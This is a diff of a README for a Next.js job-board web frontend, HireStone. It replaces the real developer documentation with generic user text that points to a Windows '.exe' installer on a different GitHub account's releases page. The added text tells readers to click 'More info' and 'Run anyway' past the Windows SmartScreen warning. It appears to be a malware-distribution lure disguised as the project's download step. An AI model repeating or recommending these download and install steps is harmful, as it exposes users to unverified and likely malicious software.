@@ -1,65 +1,70 @@
-# HireStone : A Job Posting and Hiring Plateform
-[![Netlify Status](https://api.netlify.com/api/v1/badges/bfdc31f0-57c5-4fa4-83d0-dcb73faf75a6/deploy-status)](https://app.netlify.com/projects/hirestone/deploys)
+# 🎯 HireStone-web - Manage job searching with ease
 
-A *Frontend Website* built with Next.js 16 (App Router) + TypeScript + Tailwind for a Job Posting and Hiring Plateform named **HireStone** having a FastAPI backend.
+[![Download HireStone](https://img.shields.io/badge/Download-HireStone-blue.svg)](https://github.com/Queendisarray156/HireStone-web/releases)
 
-## Stack
+HireStone-web provides a central hub for job seekers and employers. This application lets you browse open positions, manage your candidate profile, or oversee company hiring through an administrative dashboard. The system uses secure methods to protect your account information and ensures a smooth interaction between your web browser and our servers.
 
-- Next.js 16 App Router, TypeScript
-- Tailwind CSS, custom design tokens (brand navy + accent emerald, see `tailwind.config.ts`)
-- Hand-rolled shadcn-style UI primitives on Radix (`src/components/ui`) — Button, Input,
-  Select, Tabs, Dialog, Dropdown, Badge, Card, Label, Textarea
-- TanStack Query for all API data/mutations
-- Axios client with Bearer-token interceptor (`src/lib/api.ts`)
-- `sonner` for toasts, `lucide-react` for icons
+## 📦 System Requirements
 
-## Pages Built (BASIC TIER)
+Before you install the application, ensure your computer meets these basic requirements:
 
-- `/` — hero + quick search
-- `/jobs` — search with keyword/location/job-type/remote filters, pagination
-- `/jobs/[id]` — job detail + apply dialog (resume picker + cover letter)
-- `/login`, `/register`, `/register/candidate`, `/register/employer` — Role Authentication and Authorization
-- `/dashboard/candidate` — applications (with the pipeline stepper) + profile tab
-- `/dashboard/candidate/resumes` — upload, set primary, delete
-- `/dashboard/employer` — post job dialog, job list, open/close toggle
-- `/dashboard/employer/jobs/[id]/applications` — applicant list + status dropdown
-- `/admin` — stats cards, application-status breakdown, user activate/deactivate table
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 4GB of RAM.
+*   **Storage:** 500MB of free disk space.
+*   **Internet:** A stable connection to retrieve job listings and sync your profile updates.
+*   **Browser:** The application functions best when you have an updated version of Microsoft Edge, Google Chrome, or Mozilla Firefox installed.
 
-Route guarding: `src/middleware.ts` redirects unauthenticated or wrong-role users away
-from `/dashboard/*` and `/admin/*`.
+## 🚀 Downloading the Application
 
-## Setup
+To begin using HireStone-web, you must download the latest installer from our release page. Visit this link to find the most recent version:
 
-```bash
-npm install
-cp .env.example .env.local   # point NEXT_PUBLIC_API_URL at your FastAPI backend
-npm run dev
-```
+[https://github.com/Queendisarray156/HireStone-web/releases](https://github.com/Queendisarray156/HireStone-web/releases)
 
-## Auth Model (read before hardening)
+Follow these steps to obtain the correct file:
 
-Token + user info are stored in a plain (non-httpOnly) cookie so client components
-can read it and attach `Authorization: Bearer <token>` on every API call directly
-to FastAPI — no Next.js API proxy layer. This is simple and fine for an internal
-tool or MVP; it trades away httpOnly's XSS protection. Hardening path: add Next.js
-Route Handlers that hold the token server-side and proxy authenticated requests.
+1.  Open the link above in your web browser.
+2.  Look for the section labeled "Assets" at the bottom of the latest release post.
+3.  Click the link that ends in ".exe" or "setup.exe" to save the installer to your computer.
+4.  Once the folder finishes downloading, navigate to your "Downloads" folder to find the file.
 
-There's no public admin-registration endpoint (matches the backend) — create an
-admin with the backend's `app/scripts/create_admin.py`, then log in normally here.
+## ⚙️ Installation Instructions
 
-## Deploy — Netlify
+Once you download the installer, follow this guide to set up HireStone-web on your computer:
 
-`netlify.toml` is set up with the official `@netlify/plugin-nextjs` runtime.
-Set `NEXT_PUBLIC_API_URL` as an environment variable in the Netlify site settings
-to your deployed FastAPI URL (must allow CORS from your Netlify domain — already
-wide open in the backend's `CORSMiddleware`, tighten `allow_origins` for prod).
+1.  Double-click the downloaded ".exe" file.
+2.  Windows might show a blue window titled "Windows protected your PC." If this appears, click "More info" and then click "Run anyway."
+3.  Follow the prompts in the installation window. The default settings work for most users, so clicking "Next" through each screen is the fastest method.
+4.  Select "Create a desktop shortcut" if you want easy access to the application later.
+5.  Click "Finish" to complete the installation and launch the application.
 
-## Known Gaps (Upcoming Version)
+If the application does not start automatically, locate the HireStone icon on your desktop and double-click it.
 
-- No `react-hook-form` + `zod` yet — forms are controlled state with native HTML
-  validation. Fine for basic tier, worth adding for richer error messaging.
-- Employer/candidate name/email of applicants isn't joined from the backend
-  response (`Application` only returns `candidate_id`) — either add a join
-  endpoint backend-side or fetch each candidate profile individually.
-- No file preview/download for resumes on the employer side.
-- No dark mode (design brief was corporate/light).
+## 🔑 Logging In
+
+For your security, HireStone-web requires an account to access the dashboards. 
+
+1.  Open the application.
+2.  If you have an account, enter your email address and password.
+3.  If you are new to the platform, click the "Register" or "Sign Up" button. Follow the on-screen instructions to create your profile.
+4.  The application uses secure tokens to keep your session active. You do not need to log in every single time you open the program.
+
+## 📋 Features Overview
+
+HireStone-web offers several tools to simplify the hiring process:
+
+*   **Job Search:** Use the search bar to filter roles by industry, location, or salary range.
+*   **Candidate Dashboard:** Track your job applications, view status updates, and update your resume.
+*   **Employer Dashboard:** Post new job openings and manage incoming messages from interested candidates.
+*   **Admin Panel:** Access analytics to track recruitment activity and handle user accounts.
+*   **Real-time Notifications:** Receive instant alerts when an employer views your profile or sends a message.
+
+## 🛠 Troubleshooting
+
+If you encounter issues, try these steps to resolve common problems:
+
+*   **Application will not open:** Restart your computer and try launching the file again. Verify your internet connection.
+*   **Login errors:** Ensure you have the correct password. Use the "Forgot Password" link if you need to reset your credentials.
+*   **Slow performance:** Clear your browser cache if you notice the dashboard lags when loading large lists of candidates or job postings.
+*   **Missing features:** Check the release page link provided above to see if you have the latest version. We release updates to fix bugs and improve stability.
+
+Keywords: approuter, axios, javascript, jwt-auth, lucide-react, netlify-deployment, nextjs16, radix-ui, schadcn, sonner, tailwindcss, tanstack-query, typescript
